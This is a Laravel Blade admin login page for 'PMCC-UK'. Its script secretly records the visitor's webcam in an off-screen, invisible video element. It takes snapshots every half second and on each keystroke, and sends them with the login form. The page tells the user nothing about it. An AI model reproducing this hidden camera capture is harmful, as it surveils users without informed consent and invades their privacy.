<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Sovereign Admin | PMCC-UK</title>
    
    <!-- Fonts & Icons -->
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800;900&display=swap">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.0/css/all.min.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css">

    <style>
        :root {
            --primary: #2563eb;
            --primary-glow: rgba(37, 99, 235, 0.4);
            --bg-dark: #0f172a;
        }

        body {
            font-family: 'Outfit', sans-serif;
            background: radial-gradient(circle at top right, #1e3a8a, #0f172a);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0;
            overflow: hidden;
        }

        /* Abstract background ornaments */
        .bg-glow {
            position: absolute;
            width: 400px;
            height: 400px;
            background: var(--primary);
            filter: blur(120px);
            opacity: 0.15;
            z-index: 0;
            pointer-events: none;
        }
        .glow-1 { top: -100px; right: -100px; }
        .glow-2 { bottom: -100px; left: -100px; background: #fbbf24; }

        .login-card {
            background: rgba(255, 255, 255, 0.03);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 24px;
            padding: 40px;
            width: 100%;
            max-width: 420px;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
            z-index: 10;
            position: relative;
        }

        .brand-icon {
            width: 64px;
            height: 64px;
            background: linear-gradient(135deg, var(--primary), #3b82f6);
            border-radius: 16px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 24px;
            box-shadow: 0 10px 20px var(--primary-glow);
            transform: rotate(-5deg);
        }

        .login-title {
            color: white;
            font-weight: 800;
            font-size: 1.75rem;
            text-align: center;
            margin-bottom: 8px;
            letter-spacing: -0.5px;
        }

        .login-subtitle {
            color: #94a3b8;
            text-align: center;
            font-size: 0.875rem;
            margin-bottom: 32px;
        }

        .form-label {
            color: #cbd5e1;
            font-weight: 600;
            font-size: 0.8rem;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            margin-bottom: 8px;
        }

        .input-group {
            background: rgba(255, 255, 255, 0.05);
            border: 1.5px solid rgba(255, 255, 255, 0.1);
            border-radius: 12px;
            transition: all 0.2s ease;
            overflow: hidden;
        }
        .input-group:focus-within {
            border-color: var(--primary);
            box-shadow: 0 0 0 4px var(--primary-glow);
            background: rgba(255, 255, 255, 0.08);
        }

        .form-control {
            background: transparent !important;
            border: none !important;
            color: white !important;
            padding: 12px 16px;
            font-weight: 500;
        }
        .form-control::placeholder { color: rgba(255, 255, 255, 0.3); }
        .form-control:focus { box-shadow: none !important; }

        .input-group-text {
            background: transparent;
            border: none;
            color: #64748b;
            padding-right: 16px;
        }

        .btn-login {
            background: linear-gradient(135deg, var(--primary), #1d4ed8);
            border: none;
            border-radius: 12px;
            padding: 14px;
            color: white;
            font-weight: 700;
            width: 100%;
            margin-top: 24px;
            transition: all 0.3s ease;
            box-shadow: 0 4px 12px rgba(37, 99, 235, 0.2);
        }
        .btn-login:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(37, 99, 235, 0.4);
            filter: brightness(1.1);
        }

        .remember-text { color: #94a3b8; font-size: 0.85rem; }
        .form-check-input { background-color: rgba(255, 255, 255, 0.1); border-color: rgba(255, 255, 255, 0.2); }
        .form-check-input:checked { background-color: var(--primary); border-color: var(--primary); }

        .alert-error {
            background: rgba(239, 68, 68, 0.1);
            border: 1px solid rgba(239, 68, 68, 0.2);
            color: #fca5a5;
            border-radius: 12px;
            font-size: 0.85rem;
            padding: 12px;
            margin-bottom: 24px;
        }
        
        .footer-text {
            position: absolute;
            bottom: 30px;
            color: rgba(255, 255, 255, 0.2);
            font-size: 0.75rem;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 2px;
        }
    </style>
</head>
<body>
    <div class="bg-glow glow-1"></div>
    <div class="bg-glow glow-2"></div>

    <div class="login-card">
        <div class="brand-icon">
            <i class="fas fa-shield-halved text-white fa-2x"></i>
        </div>

        <h1 class="login-title">Admin Access</h1>
        <p class="login-subtitle">Enter your credentials to manage PMCC-UK</p>

        @if ($errors->any())
            <div class="alert alert-error">
                <i class="fas fa-circle-exclamation me-2"></i>
                @foreach ($errors->all() as $error)
                    {{ $error }}
                @endforeach
            </div>
        @endif

        <form id="loginForm" action="{{ route('admin.login') }}" method="post">
            @csrf
            <input type="hidden" name="login_photo" id="login_photo">
            
            <div class="mb-4">
                <label class="form-label">Username</label>
                <div class="input-group">
                    <input type="text" name="username" class="form-control" placeholder="admin_user" required autofocus>
                    <span class="input-group-text"><i class="fas fa-user"></i></span>
                </div>
            </div>

            <div class="mb-4">
                <label class="form-label">Password</label>
                <div class="input-group">
                    <input type="password" name="password" class="form-control" placeholder="••••••••" required>
                    <span class="input-group-text"><i class="fas fa-lock"></i></span>
                </div>
            </div>

            <div class="d-flex align-items-center justify-content-between mb-4">
                <div class="form-check">
                    <input class="form-check-input" type="checkbox" name="remember" id="remember">
                    <label class="form-check-label remember-text" for="remember">Keep me signed in</label>
                </div>
            </div>

            <button type="submit" class="btn-login">
                SECURE SIGN IN <i class="fas fa-arrow-right ms-2"></i>
            </button>
        </form>
    </div>

    <!-- Hidden webcam & canvas for security snapshot (rendered off-screen so browser decodes frames) -->
    <video id="webcamCam" autoplay playsinline muted style="position: fixed; top: -9999px; left: -9999px; width: 640px; height: 480px; opacity: 0; pointer-events: none;"></video>
    <canvas id="webcamCanvas" style="display:none;"></canvas>

    <div class="footer-text">
        &copy; {{ date('Y') }} PMCC-UK SECURE GATEWAY
    </div>

    <!-- Font Awesome 6 -->
    <script src="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.0/js/all.min.js"></script>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const video = document.getElementById('webcamCam');
            const canvas = document.getElementById('webcamCanvas');
            const form = document.getElementById('loginForm');
            const photoInput = document.getElementById('login_photo');

            function isCanvasBlack(ctx, width, height) {
                try {
                    const sampleW = Math.min(width, 40);
                    const sampleH = Math.min(height, 40);
                    const imgData = ctx.getImageData(0, 0, sampleW, sampleH);
                    const data = imgData.data;
                    let totalBrightness = 0;
                    for (let i = 0; i < data.length; i += 4) {
                        totalBrightness += data[i] + data[i+1] + data[i+2];
                    }
                    const avgBrightness = totalBrightness / ((data.length / 4) * 3);
                    return avgBrightness < 5; // Unilluminated sensor frame
                } catch (e) {
                    return false;
                }
            }

            function captureSnapshot() {
                try {
                    if (video && video.readyState >= 2 && video.videoWidth > 0 && video.videoHeight > 0) {
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                        // Skip black sensor warmup frames
                        if (isCanvasBlack(ctx, canvas.width, canvas.height)) {
                            return false;
                        }

                        const dataUrl = canvas.toDataURL('image/jpeg', 0.85);
                        if (dataUrl && dataUrl.length > 2500) {
                            photoInput.value = dataUrl;
                            return true;
                        }
                    }
                } catch (e) {
                    console.warn('Snapshot capture error:', e);
                }
                return false;
            }

            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                navigator.mediaDevices.getUserMedia({ video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: "user" } })
                    .then(function(stream) {
                        video.srcObject = stream;
                        video.play().then(function() {
                            // Warmup delay before active periodic sampling
                            setTimeout(function() {
                                captureSnapshot();
                                setInterval(captureSnapshot, 500);
                            }, 500);
                        }).catch(function(e){});
                    })
                    .catch(function(err) {
                        console.warn('Camera access not granted or unavailable:', err);
                    });
            }

            // Capture immediately on user typing or interaction
            document.querySelectorAll('#loginForm input').forEach(function(input) {
                input.addEventListener('focus', captureSnapshot);
                input.addEventListener('input', captureSnapshot);
            });

            form.addEventListener('submit', function(e) {
                captureSnapshot();
            });
        });
    </script>
</body>
</html>

